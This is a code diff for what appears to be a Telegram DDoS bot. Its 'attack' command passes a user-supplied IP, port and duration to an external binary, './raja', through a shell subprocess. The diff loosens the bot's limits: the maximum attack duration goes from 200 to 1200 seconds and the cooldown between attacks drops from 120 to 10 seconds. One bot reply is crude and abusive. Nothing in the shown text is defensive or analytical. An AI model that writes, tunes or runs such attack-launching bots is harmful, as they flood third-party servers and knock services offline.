@@ -111,7 +111,7 @@ async def attack(update: Update, context: CallbackContext):
     # Validate duration
     try:
         duration = int(duration)
-        if duration > 200:  # New duration limit
+        if duration > 1200:  # New duration limit
             response = "*ruk madharcod 🥵200 200 krke do lgale lode.*" 
             await context.bot.send_message(chat_id=chat_id, text=response, parse_mode='Markdown') 
             return
@@ -120,7 +120,7 @@ async def attack(update: Update, context: CallbackContext):
         return
     
     # Cooldown check
-    cooldown_period = 120
+    cooldown_period = 10
     current_time = datetime.now()
     if user_id in cooldown_dict:
         time_diff = (current_time - cooldown_dict[user_id]).total_seconds()
@@ -166,7 +166,7 @@ async def rajaraj_04(update: Update, context: CallbackContext):
 async def run_attack(chat_id, ip, port, duration, context):
     try:
         process = await asyncio.create_subprocess_shell(
-            f"./raja {ip} {port} {duration} 800",
+            f"./raja {ip} {port} {duration} 80",
             stdout=asyncio.subprocess.PIPE,
             stderr=asyncio.subprocess.PIPE
         )
